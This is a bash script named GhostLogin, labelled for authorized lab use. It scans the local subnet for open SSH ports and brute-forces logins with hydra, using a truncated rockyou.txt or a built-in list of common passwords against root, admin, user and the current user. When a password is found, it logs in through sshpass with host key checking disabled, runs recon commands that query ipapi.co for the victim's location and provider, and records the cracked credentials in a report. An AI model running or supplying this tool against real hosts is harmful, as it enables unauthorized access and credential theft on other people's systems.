#!/bin/bash


#################################################################
# GhostLogin - Automated SSH Exposure and Attack Tool           #
#                                                               #
# Scans an internal subnet for hosts exposing SSH, performs     #
# controlled authentication testing, and runs non-interactive   #
# post-access verification commands. User interaction is kept    #
# minimal (some prompts appear if a tool or wordlist is missing).#
#                                                               #
# FOR AUTHORIZED LAB / EDUCATIONAL USE ONLY.                    #
#################################################################



# checks if value is a number and greater/equal to 0 #
function is_number(){
    [ -n "$1" ] && [ "$1" -ge 0 ] 2>/dev/null
}



# getting users local IP #
function set_local_ip(){
    echo "Fetching your local IP..."
    sleep 1
    local_ip=$(ip route | grep 'link' | awk '{print $1}' | cut -d'/' -f1 | head -n 1)
    echo "Your local IP is - $local_ip"
}



# setting subnet mask #
function set_subnet_mask(){
    read -p "Enter a subnet mask between 16-32 (Recommended 24): " mask
    echo "Validating subnet mask value..."
    sleep 1

    # deleting spaces
    mask=$(echo "$mask" | tr -d '[:space:]')

    # validating value is between 16 and 32
    if is_number "$mask" && [ "$mask" -ge 16 ] && [ "$mask" -le 32 ]; then
        echo "Subnet mask - VALID"
        echo ""
    else
        echo "Subnet mask - INVALID"
        echo ""
        sleep 1
        set_subnet_mask
    fi
}

# creating an empty array for IPs with open SSH ports
ssh_array=()

# scan for SSH services #
function ssh_scan(){
    scan_result=$(nmap -n -p 22 --open "$ip_range")
    ssh_hosts=$(echo "$scan_result" | grep "Nmap scan report for" | awk '{print $5}')

    if [ -z "$ssh_hosts" ]; then
        echo "No active SSH services found."
    else
        ssh_array=($ssh_hosts)
        echo "Active SSH services found on:"
        for host in $ssh_hosts; do
            echo "[-] $host"
        done
        echo ""
    fi
}

echo "---------------------------------------"
echo "        GhostLogin - SSH Scanner       "
echo "---------------------------------------"
echo ""
sleep 1



# checking if 'hydra', 'nmap' and 'sshpass' are installed
function check_dependencies() {
echo "Verifying that required tools are installed..."
    for tool in hydra nmap sshpass; do
        if command -v $tool &> /dev/null; then
            echo "[+] Found $tool"
        else
            read -p "$tool is not installed. Would you like to install it now? (y/n): " inst_choice
            if [[ "$inst_choice" == "y" || "$inst_choice" == "Y" ]]; then
                echo "Installing $tool..."
                sudo apt update && sudo apt install -y $tool
            else
                echo "Exiting program. $tool is required."
                exit 1
            fi
        fi
    done
}

successful_logins=()
# Wordlist configuration for executing the attack #
function prepare_wordlist() {
    echo "Searching for rockyou.txt on the system... this might take a few seconds."

    # searching rockyou.txt in common folders using "find" (because "locate" might be slower and "rockyou.txt" might not be in path /usr/share/wordlists/rockyou.txt)
    local found_path=$(find /usr/share /opt /home /root /tmp /var/lib -name "rockyou.txt" 2>/dev/null | head -n 1)

# if rockyou.txt is found, the brute force attack will use rockyou.txt wordlist
    if [ -n "$found_path" ]; then
        echo "Found rockyou.txt"
        echo ""
        
        local limited_rockyou="/tmp/rockyou_limited.txt"
        
		# remove old limited file if exists
		rm -f "$limited_rockyou"
		
		# extracting only first 1100 passwords
		head -n 1100 "$found_path" > "$limited_rockyou"
		
		pass_file="$limited_rockyou"
		
    
    # if rockyou.txt is not found, the program will suggest downloading it
    else
        echo "[-] rockyou.txt not found in standard locations."
        read -p "Would you like to download it now to the current directory? (y/n): " d_choice
        
        if [ "$d_choice" = "y" ] || [ "$d_choice" = "Y" ]; then
            echo "Downloading rockyou.txt..."
            curl -L https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -o "./rockyou.txt"
            pass_file="./rockyou.txt"
        # if the user does not want to download rockyou.txt, a default list will be used
        elif [ "$d_choice" = "n" ] || [ "$d_choice" = "N" ]; then
            echo "Using built-in password list instead."
            pass_file="BUILT_IN"
            default_pass_list=("123456"
							  "123456"
							  "admin"
							  "12345678"
							  "123456789"
							  "12345"
							  "password"
							  "Aa123456"
							  "1234567890"
							  "Pass@123"
							  "admin123"
							  "1234567"
							  "qwerty123"
							  "11111111"
							  "P@sswOrd"
							  "Password"
							  "Aa@123456"
							  "qwerty1"
							  "admintelecom"
							  "Admin@123"
							  "112233"
							  "guest"
							  "qwerty"
							  "iloveyou"
							  "123123"
							  "111111"
							  "000000"
							  "secret"
							  "welcome"
							  "abc123"
							  "password1"
							  "user"
							  "Pass@1234"
							  "qwerty12345"
							  "test123"
							  "11223344"
							  "123321"
							  "sunshine"
							  "charlie"
							  "password123"
							  "12345678910"
							  "football"
							  "1q2w3e4r"
							  "princess"
							  "monkey"
							  "dragon"
							  "Demo@123"
							  "qazwsx"
							  "whatever"
							  "starwars"
							  "master")
        else
            echo "ERROR - enter y or n"
            sleep 1
            prepare_wordlist
            return
        fi
    fi
    # calling for the brute force attack function
    execute_ssh_attack "$pass_file"
}



#  #
function execute_ssh_attack() {
    local input_type=$1
    local usernames=("$(whoami)" "root" "admin" "user")

# looping through IPs with open SSH
    for host in "${ssh_array[@]}"; do
        echo "Starting automated assessment on: $host"
        local found_for_host=false
        
        # looping through target usernames for the current host
        for user in "${usernames[@]}"; do
            
            # initiating authentication using the default password list
            if [ "$input_type" == "BUILT_IN" ]; then
				# looping through each password
				# creating a new temporary file on the user's system
				# inserting each password into the temporary file
                for password in "${default_pass_list[@]}"; do
                    echo "$password" >> /tmp/passwords.txt
                done
                
                # starting the hydra authentication attempt
                hydra_output=$(hydra -l "$user" -P /tmp/passwords.txt "$host" ssh -t 4 -f 2>/dev/null)
                
                # deleting the temporary file
                rm /tmp/passwords.txt
            else
                # initiating authentication using the rockyou.txt list
                hydra_output=$(hydra -l "$user" -P "$input_type" "$host" ssh -t 4 -f 2>/dev/null)
            fi

            # testing if hydra found a password
            password=$(echo "$hydra_output" | grep "password:" | awk '{print $7}')

            if [ -n "$password" ]; then
                echo "Found credentials."
                # Record successful login for report
                successful_logins+=("IP: $host | User: $user | Password: $password")
                found_for_host=true
                
                echo "--- Extacting personal information... ---"
                sleep 2
                
                # collecting system information using sshpass
				sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$user@$host" \
				'echo "[*] Username: $(whoami)"; \
				 echo "[*] OS version: $(lsb_release -d | cut -f2 2>/dev/null || cat /etc/issue | head -n 1)"; \
				 echo "[*] Country: $(curl -s https://ipapi.co/country_name/)"; \
				 echo "[*] City: $(curl -s https://ipapi.co/city/)"; \
				 echo "[*] System running for: $(uptime -p)"; \
				 echo "[*] Service provider: $(curl -s https://ipapi.co/org/)"; \
				 echo "[*] Local time: $(date)"'
                
                echo "--------------------------------------------------------------"                
                break 
            fi
        done
        if [ "$found_for_host" = false ]; then
            echo "Failed to find credentials for $host."
            echo "--------------------------------------------------------------"
        fi
        echo ""    
    done
    
    # cleanup limited rockyou file at the end (only if used)
    if [ "$input_type" = "/tmp/rockyou_limited.txt" ] && [ -f "/tmp/rockyou_limited.txt" ]; then
        rm -f /tmp/rockyou_limited.txt
    fi
}


function generate_report() {
    echo ""
    echo "======================================="
    echo "         FINAL SESSION REPORT          "
    echo "======================================="
    
    # displaying scanned IP addresses
    if [ ${#ssh_array[@]} -eq 0 ]; then
        echo "No hosts with open SSH ports were found."
    else
        echo "Hosts found with SSH service:"
        for host in "${ssh_array[@]}"; do
            echo "[-] $host"
        done
    fi

    echo "---------------------------------------"

    # successful authentication attempts
    if [ ${#successful_logins[@]} -eq 0 ]; then
        echo "No successful logins were recorded."
    else
        echo "SUCCESSFUL ACCESS GAINED ON:"
        for entry in "${successful_logins[@]}"; do
            echo "[-] $entry"
        done
        echo ""
    fi
    
    echo "======================================="
    echo "     GhostLogin Assessment Complete    "
    echo "======================================="
}





check_dependencies 
echo ""


set_local_ip
echo ""
set_subnet_mask

ip_range="$local_ip/$mask"

echo "Selected IP range - $ip_range"
echo "Scanning for active SSH services..."
sleep 1
echo ""

ssh_scan

# if IPs were found, preparing the authentication attempt
if [ ${#ssh_array[@]} -gt 0 ]; then
    prepare_wordlist 
else
    echo "No targets to attack. Exiting."
fi

generate_report
